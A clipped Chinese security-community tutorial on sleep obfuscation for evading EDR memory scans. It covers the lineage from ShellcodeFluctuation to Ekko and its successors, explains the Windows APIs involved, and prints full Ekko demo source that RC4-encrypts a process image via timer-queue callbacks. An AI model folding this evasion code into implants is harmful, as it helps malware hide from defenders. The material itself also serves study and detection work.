---
title: 【先知】免杀对抗之睡眠混淆技术深度解析
source: https://xz.aliyun.com/news/92621
source_host: xz.aliyun.com
clip_date: 2026-08-04T17:32:27+08:00
trace_id: 1e7075b0-4108-402f-ad7b-746a969e0180
content_hash: 5b9994bc41a4a430fbec033aa2bc3b03dd1945b96eac6f284e71fc2562e6f840
status: synced
tags:
  - 先知
  - 免杀对抗
  - 内存混淆
series: null
feed_source: 先知安全技术社区
ai_summary: 睡眠期内存混淆的核心思路是：在Beacon睡眠时，借助Windows定时器队列等内核机制对进程内存做RC4加解密，只留短暂的RX/RW窗口，从而让EDR难以在睡眠期扫到明文恶意代码。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3b275244-d011-814d-be5e-da2542e707b6
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 睡眠期内存混淆的核心思路是：在Beacon睡眠时，借助Windows定时器队列等内核机制对进程内存做RC4加解密，只留短暂的RX/RW窗口，从而让EDR难以在睡眠期扫到明文恶意代码。
> 
> - **技术演进：** ShellcodeFluctuation（2021）需保留RX内存易被检测；Ekko（2022）改用CreateTimerQueueTimer借内核线程加密，去除RX特征；Cronos换用WaitableTimer+RC4绕过定时器队列检测；FOLIAGE改用APC+ROP链；2023年后转向调用栈伪造与堆栈加密（DreamWalkers、SilentMookwalk）。
> - **运行期混淆：** 另有Page Streaming、kong-loader等运行期方案，可做到按页或按指令解密；kong-loader依靠单步异常逐指令解密，隐蔽性更强但执行效率大幅下降。
> - **关键技术依赖：** 利用CONTEXT结构体保存CPU寄存器快照；RtlCaptureContext捕获现场；NtContinue恢复寄存器以跳转到目标函数；SystemFunction032（Advapi32未导出）实现RC4对称加密；CreateTimerQueueTimer创建定时器回调执行加解密。
> - **EKko实现时序：** 先用定时器回调RtlCaptureContext捕获当前线程上下文，并拷贝6份CONTEXT；随后6个定时器分别在100ms改内存权限为RW、200ms加密、300ms等待睡眠、400ms解密、500ms改回RX、600ms触发事件恢复执行。
> - **适用取舍：** 实际攻防中Beacon绝大多数时间处于睡眠，执行仅毫秒级，因此睡眠期加密比运行期混淆效率更高，是当前多数红队工具的首选方案。

## 0x01 前言

免杀对抗已经从 文件对抗 到 行为对抗，现在演化到 内存对抗，内存对抗分为很多维度，比如内存类型是Private Memory、Mapped Memory还是Image Memory，内存中的数据是否包含已知的恶意代码，调用栈是否可疑等等，其中内存混淆是用来解决内存数据中包含已知的恶意代码

提到内存混淆技术，大家都会想到c5pider的ekko，其实ekko只是内存混淆技术发展史的一环

2021年，github @mgeeky提出了ShellcodeFluctuation技术，实现了内存睡眠时混淆，使用时解密，不过有一个缺点，至少要有一块RX内存来做这件事，做这件事的RX内存也就成了EDR的检测点

2022年，twitter @C5pider改进后提出了Ekko技术，创新性的通过CreateTimerQueueTimer，借助Windows内核实现内存的加密解密，完美规避需要一块RX内存这个特征

2022年，github @Idov31改进后提出了Cronos技术，Ekko使用的是CreateTimerQueueTimer，在EDR扫描定时器队列时易被检测到，于是改用WaitableTimer，再配合RC4加密，可以绕过针对Ekko定时器队列的检测

2022年，linkedin @Austin H.等人改进后提出了FOLIAGE技术，转变了思路改用APC，通过NtQueueApcThread + NtTestAlert实现ROP链，一度绕过大量基于定时器检测的EDR

2023年起，EDR厂商发现，检测重心是定时器或其他的ROP链，攻击者还会发明新的ROP链，于是转向另一个维度，“调用堆栈”，基于此，DreamWalkers、SilentMookwalk等技术相继被提出，实现了调用栈伪造和堆栈加密

其实，像ShellcodeFluctuation、Ekko、Cronos、FOLIAGE这类技术，属于睡眠期内存混淆技术，还有一类运行期内存混淆技术，可以实现用到哪个内存页，解密哪个内存页，最多保留3个内存页被解密，其余内存页均被加密，这样可以有效规避基于内存YARA特征的检测，比如Cobalt Strike的创造者Raphael Mudge提出的Page Streaming，不过执行效率会受到一定影响

更有甚者，实现了按指令解密，比如github @tijme提出的kong-loader，CPU每执行完一条指令，触发一次单步调试异常，VEH拦截到这个异常后，动态解密下一条指令，这样EDR每次只能看到一个指令，更加难以检测，不过这会导致运行效率低很多很多

也许免杀对抗演进的后面会用到运行时内存混淆技术，不过当前的实际攻防中，Beacon在99%的时间都是睡眠的，执行时间为毫秒级别，而且 睡眠期内存混淆技术 相对 运行期内存混淆技术 运行效率也更高，所以多数红队武器研发人员都会采用睡眠期内存加密技术，本文基于Ekko，将睡眠期内存加密技术讲清楚，从技术细节，到代码实现

## 0x02 技术细节

如果一块RX内存都不留，还要做加密解密操作，自身是无法实现的，就需要借助外界的进程（线程）来做这件事，这里借助的是Windows定时器队列（Windows Timer Queue）

想掌握技术细节，需要依次掌握下面几个概念

## CONTEXT结构体

在 Windows 操作系统中，CONTEXT 结构体是一个极其核心的底层数据结构。它本质上是 CPU 寄存器在内存中的一份完整镜像。

当系统进行线程切换、发生异常（Exception），或者像 EKKO 技术这样进行线程劫持时，Windows 都会把当前 CPU 的所有寄存器状态（如当前执行到哪行代码、栈顶在哪里、通用寄存器里存了什么）打包存入一个 CONTEXT 结构体中。

由于不同的 CPU 架构（如 x86、x64、ARM）拥有完全不同的寄存器，因此 CONTEXT 结构体在不同的架构下原型是完全不同的。

下面重点展示 x64 (AMD64) 架构下的 CONTEXT 结构体原型，在 Windows SDK 的 WinNT.h 头文件中，x64 架构的 CONTEXT 完整定义如下（为了便于阅读，已省略部分对齐填充和不常用的调试寄存器）

```plain
typedef struct DECLSPEC_ALIGN(16) _CONTEXT {
    // 1. 控制标志：决定了当下这个结构体里哪些寄存器数据是有效的
    DWORD ContextFlags;

    // 2. 调试寄存器 (Debug Registers)
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;

    // 3. 段寄存器 (Segment Registers)
    WORD   SegCs;
    WORD   SegDs;
    WORD   SegEs;
    WORD   SegFs;
    WORD   SegGs;
    WORD   SegSs;
    DWORD  EFlags;

    // 4. 通用寄存器 (整数寄存器 - Integer Registers)
    // EKKO 技术中重点伪造和利用的就是这一部分
    DWORD64 Rax;
    DWORD64 Rcx;    // EKKO 用来传参数 1 (如 ImageBase)
    DWORD64 Rdx;    // EKKO 用来传参数 2 (如 ImageSize)
    DWORD64 Rbx;
    DWORD64 Rsp;    // 栈指针寄存器：指向当前线程的栈顶
    DWORD64 Rbp;
    DWORD64 Rsi;
    DWORD64 Rdi;
    DWORD64 R8;     // EKKO 用来传参数 3 (如 PAGE_READWRITE)
    DWORD64 R9;     // EKKO 用来传参数 4 (如 &OldProtect)
    DWORD64 R10;
    DWORD64 R11;
    DWORD64 R12;
    DWORD64 R13;
    DWORD64 R14;
    DWORD64 R15;

    // 5. 指令寄存器 (Instruction Pointer)
    // 指向当前 CPU 要执行的指令地址
    DWORD64 Rip;

    // 6. 浮点与流式 SIMD 扩展寄存器 (Floating Point / MMX / SSE)
    union {
        XMM_SAVE_AREA32 FltSave;
        struct {
            M128A Header[2];
            M128A Legacy[8];
            M128A Xmm0;
            M128A Xmm1;
            ...
            M128A Xmm15;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;

    M128A VectorRegister[26];
    DWORD64 VectorControl;

    // 7. 特殊控制寄存器
    DWORD64 DebugControl;
    DWORD64 LastBranchToRip;
    DWORD64 LastBranchFromRip;
    DWORD64 LastExceptionToRip;
    DWORD64 LastExceptionFromRip;
} CONTEXT, *PCONTEXT;
```

## RtlCaptureContext

用于捕获当前CPU各寄存器的值到结构体CONTEXT中，包括RIP寄存器、RCX寄存器、RDX寄存器、R8寄存器、R9寄存器、等等，熟悉汇编的人会立刻想到，在x64系统中，RIP存储下一条要执行的指令，RCX、RDX、R8、R9分别存储前4个参数

## NtContinue

用于读取结构体CONTEXT中的值，恢复到各个寄存器，其中就包括RIP寄存器，也就是说程序的执行流程会变为恢复后RIP指向的函数

## SystemFunction032

使用Advapi32.dll中的未导出函数 SystemFunction032 实现加解密，它底层实现的是RC4加密算法，这是一种对称加密

## CreateTimerQueueTimer

用于创建一个基于线程池的定时器，就是说，创建好定时器后，由Windows内核调用线程池中的线程来执行，不需要程序自身执行，也就对应最初的理念，一块RX内存都不需要实现内存的加密解密

```plain
BOOL CreateTimerQueueTimer(
  [out]          PHANDLE              phNewTimer,  // 接收定时器句柄
  [in, optional] HANDLE               TimerQueue,  // 定时器队列句柄
  [in]           WAITORTIMERCALLBACK  Callback,    // 回调函数指针
  [in, optional] PVOID                Parameter,   // 回调函数参数
  [in]           DWORD                DueTime,     // 首次到期时间 (毫秒)
  [in]           DWORD                Period,      // 后续周期 (毫秒)
  [in]           ULONG                Flags        // 执行选项标志
);
```

第1个参数是输出参数，接收这个API返回的句柄  
第2个参数，默认值为NULl，表示使用系统默认的定时器队列，但手动创建一个队列，可以避免和队列中的其他定时器冲突，更好一些  
第3个参数，定时器到期时，要执行的回调函数  
第4个参数，回调函数的参数  
第5个参数，定时器首次到期的时间，单位毫秒  
第6个参数，定时器执行周期，每隔多久执行一次，单位毫秒，设为0仅执行1次  
第7个参数，控制回调函数被执行的标志，可以先不管

## 0x03 代码实现

## Ekko.h

```plain
#ifndef EKKO_EKKO_H
#define EKKO_EKKO_H

#include <windows.h>

typedef struct
{
    DWORD    Length;
    DWORD    MaximumLength;
    PVOID    Buffer;
} USTRING ;

VOID EkkoObf( DWORD SleepTime );

#endif
```

通过#ifndef实现头文件保护，功能类似#pragma once  
定义一个结构体，声明一个函数

## Common.h

```plain
#ifndef EKKO_COMMON_H
#define EKKO_COMMON_H

#include <windows.h>
#include <stdio.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#endif
```

通过#ifndef实现头文件保护，功能类似#pragma once  
定义几个函数宏

## Main.c

```plain
#include <Common.h>
#include <Ekko.h>

int main(  )
{
    puts( "[*] Ekko Sleep Obfuscation by C5pider" );

    do
        // Start Sleep Obfuscation
        EkkoObf( 4 * 1000 );
    while ( TRUE );

    return 0;
}
```

主函数

## Ekko.c

代码被我稍微排版了下，方便阅读

```plain
#include <Common.h>
#include <Ekko.h>

VOID EkkoObf( DWORD SleepTime )
{
    // 初始化头文件中定义的结构体
    // 定义加密密钥，存入结构体Key中
    USTRING Key = { 0 };
    CHAR KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };    
    Key.Length  = 16;
    Key.MaximumLength = 16;
    Key.Buffer  = KeyBuf;
    
    // 初始化头文件中定义的结构体
    // 获取当前进程在内存中的首地址及大小，存入结构体Img中
    USTRING Img = { 0 };
    PVOID   ImageBase   = NULL;
    DWORD   ImageSize   = 0;
    ImageBase = GetModuleHandleA( NULL );
    ImageSize = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
    Img.Length  = ImageSize;
    Img.MaximumLength = ImageSize;
    Img.Buffer  = ImageBase;

    // 动态获取NtContinue和SystemFunction032的地址
    // 有的同学可能会问，为什么后面的RtlCaptureContext不用动态获取，因为RtlCaptureContext相对更无害，允许它出现在PE导入表中
    PVOID   NtContinue  = NULL;
    PVOID   SysFunc032  = NULL;
    NtContinue  = GetProcAddress( GetModuleHandleA( "Ntdll" ), "NtContinue" );
    SysFunc032  = GetProcAddress( LoadLibraryA( "Advapi32" ),  "SystemFunction032" );

    // 存储当前CPU的寄存器状态
    CONTEXT CtxThread   = { 0 };
    
    // 整个内存加密流程涉及：修改内存权限为RX、加密、解密、修改内存权限为RW，每个步骤需要一个函数执行，每个函数设置自己的CPU寄存器值，通过NtContinue恢复寄存器后执行
    CONTEXT RopProtRW   = { 0 };
    CONTEXT RopMemEnc   = { 0 };
    CONTEXT RopDelay    = { 0 };
    CONTEXT RopMemDec   = { 0 };
    CONTEXT RopProtRX   = { 0 };
    CONTEXT RopSetEvt   = { 0 };

    // 调用CreateTimerQueueTimer创建定时器，借助线程池中的线程执行RtlCaptureContext，捕获当前CPU中寄存器的状态，存入CtxThread
    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;
    DWORD   OldProtect  = 0;
    hEvent      = CreateEventW( 0, 0, 0, 0 );
    hTimerQueue = CreateTimerQueue();
    if ( CreateTimerQueueTimer( &hNewTimer, hTimerQueue, RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
    {
        // 调用WaitForSingleObject等待0x32毫秒，给RtlCaptureContext留出时间捕获
        WaitForSingleObject( hEvent, 0x32 );

        // 同样的CtxThread拷贝6份
        memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );

        // 第1份拷贝调用VirtualProtect
        // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp  -= 8;
        RopProtRW.Rip   = VirtualProtect;
        RopProtRW.Rcx   = ImageBase;
        RopProtRW.Rdx   = ImageSize;
        RopProtRW.R8    = PAGE_READWRITE;
        RopProtRW.R9    = &OldProtect;

        // 第2份拷贝用于加密
        // SystemFunction032( &Key, &Img );
        RopMemEnc.Rsp  -= 8;
        RopMemEnc.Rip   = SysFunc032;
        RopMemEnc.Rcx   = &Img;
        RopMemEnc.Rdx   = &Key;

        // 将加密状态保持一段时间
        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp   -= 8;
        RopDelay.Rip    = WaitForSingleObject;
        RopDelay.Rcx    = NtCurrentProcess();
        RopDelay.Rdx    = SleepTime;

        // 解密
        // SystemFunction032( &Key, &Img );
        RopMemDec.Rsp  -= 8;
        RopMemDec.Rip   = SysFunc032;
        RopMemDec.Rcx   = &Img;
        RopMemDec.Rdx   = &Key;

        // 修改权限
        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rip   = VirtualProtect;
        RopProtRX.Rcx   = ImageBase;
        RopProtRX.Rdx   = ImageSize;
        RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9    = &OldProtect;

        // 设置事件，触发WaitForSingleObject
        // SetEvent( hEvent );
        RopSetEvt.Rsp  -= 8;
        RopSetEvt.Rip   = SetEvent;
        RopSetEvt.Rcx   = hEvent;

        puts( "[INFO] Queue timers" );

        // 线程池中的线程在 100ms 时帮我们改了权限，200ms 时帮我们加了密，300ms 时睡眠，400ms时解密，500ms时改权限，600ms时触发WaitForSingleObject让线程继续执行
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );

        puts( "[INFO] Wait for hEvent" );
        WaitForSingleObject( hEvent, INFINITE );
        puts( "[INFO] Finished waiting for event" );
    }

    DeleteTimerQueue( hTimerQueue );
}
```

需要注意，上述代码并不是工程中可用的，仅为Demo代码

加密解密函数SystemFunction032需要的参数是结构体类型，首先对结构体进行初始化，要加密的内存首地址、内存大小、加密的密钥、密钥大小

通过GetProcAddress动态获取NtContinue和SystemFunction032的地址

调用CreateTimerQueueTimer创建定时器，借助线程池中的线程执行RtlCaptureContext，捕获当前CPU中寄存器的状态，存入CtxThread

调用WaitForSingleObject等待0x32毫秒，给RtlCaptureContext留出时间捕获

同样的CtxThread拷贝6份，第1份拷贝修改权限为RW，第2份拷贝执行加密，第3份拷贝等待一会，第4份拷贝解密，第5份拷贝修改权限为RX，第6份拷贝设置事件触发WaitForSingleObject继续执行主线程

最终，线程池中的线程在 100ms 时帮我们改了权限，200ms 时帮我们加了密，300ms 时睡眠，400ms时解密，500ms时改权限，600ms时触发WaitForSingleObject让线程继续执行

## 0x04 尾语

本文并未深入到工程层面去讲解睡眠混淆技术，更多面向初学者如何搞懂睡眠混淆，其中也掺杂着自己的理解，如有错误之处，请指正，其他的睡眠期内存混淆技术根本上同理，仅调用的API、实现方式不同
